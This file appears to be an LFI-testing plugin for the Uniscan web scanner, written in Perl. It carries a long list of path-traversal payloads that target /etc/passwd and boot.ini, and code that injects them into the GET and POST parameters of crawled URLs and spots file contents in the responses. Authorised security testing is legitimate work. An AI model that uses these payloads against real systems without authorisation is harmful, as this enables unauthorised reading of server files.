package Plugins::Tests::Dynamic::checkLFI;

use Uniscan::Configure;
use Uniscan::Functions;
use Thread::Queue;
use Uniscan::Http;
use threads;

my $c = Uniscan::Configure->new(conffile => "uniscan.conf");
my $func = Uniscan::Functions->new();
my $http = Uniscan::Http->new();
my $q = new Thread::Queue;


sub new {
	my $class    = shift;
	my $self     = {name => "Local File Include tests", version => 1.1};
	our $enabled  = 1;
	our %conf = ( );
	%conf = $c->loadconf();
	return bless $self, $class;
}

sub clean{
	my $self = shift;
}



sub execute(){
	my ($self, @urls) = @_;
	our @LFI = ('../../../../../../../../../../etc/passwd%00',
				'../../../../../../../../../../etc/passwd%00.jpg',
				'../../../../../../../../../../etc/passwd%00.html',
				'../../../../../../../../../../etc/passwd%00.css',
				'../../../../../../../../../../etc/passwd%00.php',
				'../../../../../../../../../../etc/passwd%00.txt',
				'../../../../../../../../../../etc/passwd%00.inc',
				'../../../../../../../../../../etc/passwd%00.png',
				'../../../../../../../../../../etc/passwd',
				'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
				'//../../../../../../../../etc/passwd',
				'//../../../../../../../../etc/passwd%00',
				'//../../../../../../../../etc/passwd%00en',
				'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
				'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
				'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
				'//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
				'//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
				'//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
				'//....................etc/passwd',
				'//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255..%255..%255cetc/passwd',
				'//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd',
				'//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd',
				'//%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252eetc/passwd',
				'../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
				'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
				'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
				'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
				'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
				'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
				'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
				'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
				'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.jpg',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.html',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.css',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.php',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.txt',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.inc',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.png',
				'..\..\..\..\..\..\..\..\..\..\..\boot.ini',
				'c:\boot.ini',
				'c:\boot.ini%00'
				);
	$func->write("|"." "x99);
	$func->write("|"." "x99);
	$func->write("| ". $conf{'lang128'} .":");
	$func->writeHTMLItem($conf{'lang128'} .":<br>");
	&ScanLFICrawler(@urls);	
	&ScanLFICrawlerPost(@urls);
}


##############################################
#  Function ScanLFICrawler
#  this function check LFI Vulnerabilities 
#
#
#  Param: @urls
#  Return: nothing
##############################################


sub ScanLFICrawler(){
	my @urls = @_;
	my @tests = &GenerateTests("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFI", @tests) if(scalar(@tests));
}




sub GenerateTests(){
	my ($test, @list) = @_;
	my @list2 = ();
	my %hash = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/ && $line !~/#/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				no strict 'refs';
				if($var_temp){
					foreach my $str (@{$test}){
						$temp = $line;
						$str = urlencode($str) if($conf{'url_encode'} == 1);
						my $t = $var_temp . $str;
						$temp =~ s/\Q$variables[$x]\E/$t/g;
						if(!$hash{$temp}){
							push(@list2, $temp);
							$hash{$temp} = 1;
						}
					}
				}
			}
		@variables = ();
		}
	}
	@list = ();
	return @list2;
}

sub GenerateTestsPost(){
  	my ($test, @list) = @_;
  	my @list2 = ();
	my %hash = ();
  	foreach my $line (@list){
	if($line =~/#/){
  		my ($url, $line) = split('#', $line);
  		$line =~ s/&amp;/&/g;
  		$line =~ s/\[\]//g;
			if($line =~ /=/){
				my $temp = $line;
				$temp = substr($temp,index($temp, '?')+1,length($temp));
				my @variables = split('&', $temp);
				for(my $x=0; $x< scalar(@variables); $x++){
					my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
					no strict 'refs';
					if($var_temp){
						foreach my $str (@{$test}){
							$temp = $line;
							$str = urlencode($str) if($conf{'url_encode'} == 1);
							my $t = $var_temp . $str;
							$temp =~ s/\Q$variables[$x]\E/$t/g;
							if(!$hash{$temp}){
								push(@list2, $url . '#' .$temp);
								$hash{$temp} = 1;
							}
						}
					}
				}
			}
		}
	}
  	@list = ();
  	return @list2;
 }


sub urlencode {
    my $s = shift;
    $s =~ s/ /+/g;
    $s =~ s/([^A-Za-z0-9\+-])/sprintf("%%%02X", ord($1))/seg;
    $s =~s/%7C/\|/g;
    $s =~ s/%25/%/g;
    return $s;
}


sub threadnize(){
	my ($fun, @tests) = @_;
	foreach my $test (@tests){
		$q->enqueue($test) if($test);
	}

	my $x=0;
	my @threads = ();
	while($q->pending() && $x <= $conf{'max_threads'}-1){
		no strict 'refs';
		push @threads, threads->new(\&{$fun});
		$x++;
	}

	sleep(2);
	foreach my $running (@threads) {
		$running->join();
		print "[*] ".$conf{'lang65'}.": ". $q->pending ."       \r";
	}
	@threads = ();
}



##############################################
#  Function ScanLFICrawlerPost
#  this function check LFI Vulnerabilities 
#  on forms
#
#  Param: @urls
#  Return: nothing
##############################################

sub ScanLFICrawlerPost(){
	my @urls = @_;
	my @tests = &GenerateTestsPost("LFI", @urls);
	@tests = $func->remove(@tests) if(scalar(@tests));
	&threadnize("TestLFIPost", @tests) if(scalar(@tests));
}




##############################################
#  Function TestLFI
#  this function test LFI Vulnerabilities 
#
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFI(){

my ($resp, $test) = 0;
	while($q->pending > 0){
		$test = $q->dequeue;
		next if(not defined $test);
		next if($test =~/#/g);
		print "[*] ".$conf{'lang65'}.": ". $q->pending ."       \r";
		$resp = $http->GET($test);
		if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){

			$func->write("| [+] Vul [LFI] $test  ");
			$func->writeHTMLValue($test);
			$func->writeHTMLVul("LFI");
		}
		$resp = 0;
	}
	$q->enqueue(undef);
}


##############################################
#  Function TestLFIPost
#  this function test LFI Vulnerabilities 
#  on forms
#
#  Param: $test
#  Return: nothing
##############################################

sub TestLFIPost(){
	while($q->pending > 0){
		my $test = $q->dequeue;
		next if(not defined $test);
		if($test =~ /#/){
			my ($url, $data) = split('#', $test);
			print "[*] ".$conf{'lang65'}.": ". $q->pending ."       \r";
			my $resp = $http->POST($url, $data);
			if($resp =~/root:x:0:0:root/ || ($resp =~/boot loader/ && $resp =~/operating systems/ && $resp =~/WINDOWS/)){

				$func->write("| [+] Vul [LFI] $url               \n| ". $conf{'lang130'}.": $data               ");
				$func->writeHTMLValue($url."<br>".$conf{'lang130'}.": $data");
				$func->writeHTMLVul("BSQL-I");
			}
			$resp = 0;
		}
	}
	$q->enqueue(undef);
}

sub status(){
 my $self = shift;
 return $enabled;
}

1;
